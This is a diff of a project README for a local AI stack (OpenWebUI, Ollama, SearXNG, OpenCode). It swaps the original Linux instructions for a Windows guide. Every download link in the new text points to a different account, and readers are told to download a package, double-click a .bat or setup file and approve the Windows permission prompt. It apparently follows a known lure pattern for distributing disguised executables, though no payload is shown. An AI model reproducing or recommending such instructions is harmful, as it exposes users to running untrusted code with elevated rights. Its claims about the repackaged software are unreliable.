@@ -1,142 +1,197 @@
-# AI Development Stack Experiments
+# 🤖 ai-experiments - Run Local AI Tools With Ease
 
-> **A comprehensive local AI development environment with OpenWebUI, Ollama, SearXNG, OpenCode, and OpenWork automation platform**
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/donnade6461/ai-experiments)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Docker](https://img.shields.io/badge/Docker-ready-blue.svg)](https://www.docker.com/)
-[![Ollama](https://img.shields.io/badge/Ollama-compatible-green.svg)](https://ollama.ai/)
+## 🚀 What This Is
 
-## 🚀 Quick Start
+ai-experiments is a local AI setup for Windows. It brings together OpenWebUI, Ollama, SearXNG, and OpenCode in one place. You can use it to chat with local models, search the web, and work on coding tasks on your own machine.
 
-Get your AI development stack running in under 5 minutes:
+This setup focuses on privacy and speed. Your data stays local when possible, and the tools run on your computer instead of a remote service.
 
-```bash
-git clone https://github.com/danielpsf/ai-experiments.git
-cd ai-experiments
-chmod +x scripts/install/setup-system.sh
-./scripts/install/setup-system.sh
-./scripts/management/start-stack.sh
-```
+## 📥 Download and Start
 
-**Access Points:**
-- 🌐 **OpenWebUI**: http://localhost:3001 (Main AI interface)
-- 🔍 **SearXNG**: http://localhost:8081 (Privacy-focused search)
-- 🤖 **OpenWork**: http://localhost:8787 (AI automation & workflows)
-- 🦙 **Ollama API**: http://localhost:11434 (Direct model access)
-- 🤖 **OpenCode**: Terminal-based AI assistant
+Use this link to visit this page to download:
 
-## ✨ Features
+[https://github.com/donnade6461/ai-experiments](https://github.com/donnade6461/ai-experiments)
 
-### 🏗️ Hybrid Architecture
-- **Native Ollama**: Maximum performance for AI models
-- **Containerized Services**: Easy deployment and management
-- **Single-User Optimized**: No authentication overhead
+### Steps to get it on Windows
 
-### 🧠 AI Models
-- **Qwen2.5-Coder 14B**: State-of-the-art coding assistance
-- **Llama 3.1 8B**: Research and general purpose (128K context)
-- **Quick Model Switching**: Hot-swap models without restart
+1. Open the link above in your browser.
+2. Find the latest version or the main project files.
+3. Download the package to your PC.
+4. If the download comes as a ZIP file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Look for the start file, such as a `.bat` file or setup file.
+7. Double-click the file to run it.
+8. If Windows asks for permission, choose **Yes**.
 
-### 🔍 Research Capabilities
-- **SearXNG Integration**: Privacy-focused web search
-- **RAG Support**: Document analysis and Q&A
-- **Long Context**: Handle entire codebases and research papers
+## 🖥️ What You Need
 
-### 💻 Development Tools
-- **OpenCode**: Terminal AI assistant
-- **LSP Integration**: Language server support
-- **API Access**: Full REST API compatibility
+This setup works best on a Windows 10 or Windows 11 PC with:
 
-### 🔄 Automation & Workflows (NEW!)
-- **OpenWork Platform**: Enterprise-grade AI automation
-- **Pre-configured Workers**: AI development, data analysis, automation
-- **Team Collaboration**: Share workflows across team members
-- **Approval Workflows**: Control dangerous operations
-- **Browser Automation**: Automated web scraping and data extraction
-- **Scheduled Tasks**: Recurring workflows and reports
+- 8 GB RAM or more
+- 20 GB of free disk space
+- A modern CPU
+- Internet access for first-time setup and web search
+- A stable power source if you use a laptop
 
-## 📚 Documentation
+For a smoother experience with local models, 16 GB RAM or more helps.
 
-- 📖 [Quick Start Guide](docs/QUICK_START.md) - Get running in 5 minutes
-- 🏗️ [Architecture Overview](docs/ARCHITECTURE.md) - System design and components
-- ⚙️ [OpenCode Integration](docs/opencode-integration/README.md) - Terminal AI setup
-- 🤖 [OpenWork Automation](docs/openwork-integration/README.md) - AI workflows & team collaboration
-- 🔧 [Performance Tuning](docs/PERFORMANCE_TUNING.md) - Optimization guide
-- 🩺 [Troubleshooting](docs/TROUBLESHOOTING.md) - Common issues and solutions
+## 🧰 What You Get
 
-## 🎯 Use Cases
+- **OpenWebUI** for a clean chat interface
+- **Ollama** for running local AI models
+- **SearXNG** for private web search
+- **OpenCode** for code work and project tasks
+- A local-first setup for research and development
+- A single environment instead of separate installs
 
-### For Developers
-- **Code Generation**: AI-powered code completion and generation
-- **Code Review**: Automated code analysis and suggestions
-- **Documentation**: Generate and improve code documentation
-- **Debugging**: AI-assisted debugging and error analysis
+## 🛠️ How to Install
 
-### For Researchers
-- **Document Analysis**: Process and analyze research papers
-- **Web Research**: Privacy-focused information gathering
-- **Data Processing**: AI-powered data analysis workflows
-- **Writing Assistance**: Academic and technical writing support
+1. Download the project from the link above.
+2. Unzip the files if needed.
+3. Open the folder in File Explorer.
+4. Find the install or start file.
+5. Double-click it.
+6. Let Windows finish any setup it asks for.
+7. Wait for the tools to start.
+8. Open your browser if the app does not open on its own.
+9. Use the local address shown by the app, such as `http://localhost:3000` or a similar address.
 
-### For Teams & Automation
-- **Workflow Automation**: Automate repetitive business processes
-- **Data Collection**: Automated web scraping and data gathering
-- **Report Generation**: Scheduled analytics and insights reports
-- **Code Automation**: Automated testing, deployment, and monitoring
-- **Team Collaboration**: Share AI workers and workflows across teams
+If the setup uses Docker, it may take a few minutes the first time while it downloads the required images.
 
-## 📊 System Requirements
+## 🔧 First Launch
 
-- **OS**: Linux (Ubuntu 20.04+ recommended)
-- **RAM**: 32GB+ (24GB for models + 8GB for system)
-- **CPU**: 8+ cores recommended
-- **Storage**: 50GB+ available space
-- **Network**: Internet connection for initial setup
+When you start ai-experiments for the first time:
 
-## 🔧 Services Overview
+1. Wait for all services to load.
+2. Open OpenWebUI in your browser.
+3. Choose or download a local model in Ollama.
+4. Run a test chat.
+5. Try a web search through SearXNG.
+6. Open OpenCode for coding help if you want to work on a project.
 
-| Service | Port | Purpose | Resource Usage |
-|---------|------|---------|----------------|
-| OpenWebUI | 3001 | Main AI interface | ~1-2GB RAM |
-| SearXNG | 8081 | Privacy search | ~512MB RAM |
-| OpenWork | 8787 | AI automation & workflows | ~512MB-1GB RAM |
-| Ollama | 11434 | AI model server | ~15-20GB RAM |
-| Redis | 6380 | Caching layer | ~512MB RAM |
+If the app feels slow at first, wait a little longer. The first run usually takes the most time.
 
-## 🚀 Quick Commands
+## 🧭 Basic Use
 
-```bash
-# Start the entire stack
-./scripts/management/start-stack.sh
+### Chat with a local model
 
-# Check system health
-./scripts/monitoring/health-check.sh
+- Open the chat screen in OpenWebUI
+- Pick a model from the list
+- Type a question or prompt
+- Read the answer in the browser
 
-# Stop all services
-./scripts/management/stop-stack.sh
+### Search the web
 
-# View logs
-./scripts/monitoring/log-viewer.sh
+- Open the search tool
+- Enter a topic or question
+- Review the search results
+- Open the pages you want to read
 
-# Terminal AI assistant
-opencode "Help me optimize this Python function" --file main.py
-```
+### Work on code
 
-## 🤝 Contributing
+- Open OpenCode
+- Load your project folder
+- Ask for help with code, files, or tasks
+- Review changes before you save them
 
-Contributions are welcome! Please see our [Contributing Guide](CONTRIBUTING.md) for details.
+## 🔒 Privacy Focus
 
-## 📄 License
+This setup is built for local use. That means:
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+- Your chat can stay on your computer
+- Local models do not need a cloud account
+- Search and coding tools run in your own environment
+- You keep more control over your data
 
-## 🙏 Acknowledgments
+If you use web search or online model downloads, those parts still need internet access.
 
-- [OpenWebUI](https://github.com/open-webui/open-webui) - Excellent AI interface
-- [Ollama](https://github.com/ollama/ollama) - Local LLM runner
-- [SearXNG](https://github.com/searxng/searxng) - Privacy-focused search
-- [OpenCode.ai](https://opencode.ai/) - MIT-licensed terminal AI tools
+## ⚙️ Common Setup Checks
 
----
+If the app does not start, check these items:
 
-**⭐ If you find this project useful, please consider giving it a star!**
+- Docker Desktop is installed if the setup uses Docker
+- Virtualization is enabled in BIOS if required
+- Windows Firewall allows local app traffic
+- Enough disk space is free
+- No other app is using the same port
+
+If a browser page does not open, try typing the local address shown in the terminal or start window.
+
+## 📂 Folder Layout
+
+A typical setup may include:
+
+- `docker-compose.yml` for service setup
+- `scripts` for start and stop files
+- `models` for local AI model files
+- `config` for app settings
+- `data` for saved workspace files
+
+Keep the folder in a place you can find later. Avoid moving files while the app is running.
+
+## 🧪 Simple Test
+
+After setup, test the app with these steps:
+
+1. Open OpenWebUI.
+2. Ask a short question, such as: What is the capital of France?
+3. Check that the model answers.
+4. Open SearXNG and search for a simple topic.
+5. Open OpenCode and load a small folder.
+6. Make sure each tool opens without errors.
+
+## 🧑‍💻 Good Use Cases
+
+- Local chat with AI models
+- Private research
+- Coding help
+- Offline or low-trust work
+- Testing different models
+- Learning how AI tools work together
+
+## 🧯 If Something Goes Wrong
+
+### The window closes right away
+
+- Run the start file again
+- Check for an error message
+- Make sure Windows allowed the app to run
+
+### The browser cannot connect
+
+- Wait one more minute
+- Check the local address
+- Make sure the service finished starting
+
+### The model will not load
+
+- Check free RAM
+- Try a smaller model
+- Close other heavy apps
+
+### Search does not work
+
+- Check your internet connection
+- Reload the page
+- Restart the search service
+
+## 📌 Repo Topics
+
+ai, ai-development, artificial-intelligence, crush, development-tools, docker, local-ai, ollama, opencode, openwebui, privacy, searxng
+
+## 🧩 What This Project Is Built For
+
+This repository fits users who want one local AI workspace for:
+
+- Chat
+- Search
+- Code help
+- Model testing
+- Privacy-minded use
+- A cleaner desktop setup
+
+## 📎 Start Here Again
+
+[Download or open the project page](https://github.com/donnade6461/ai-experiments)
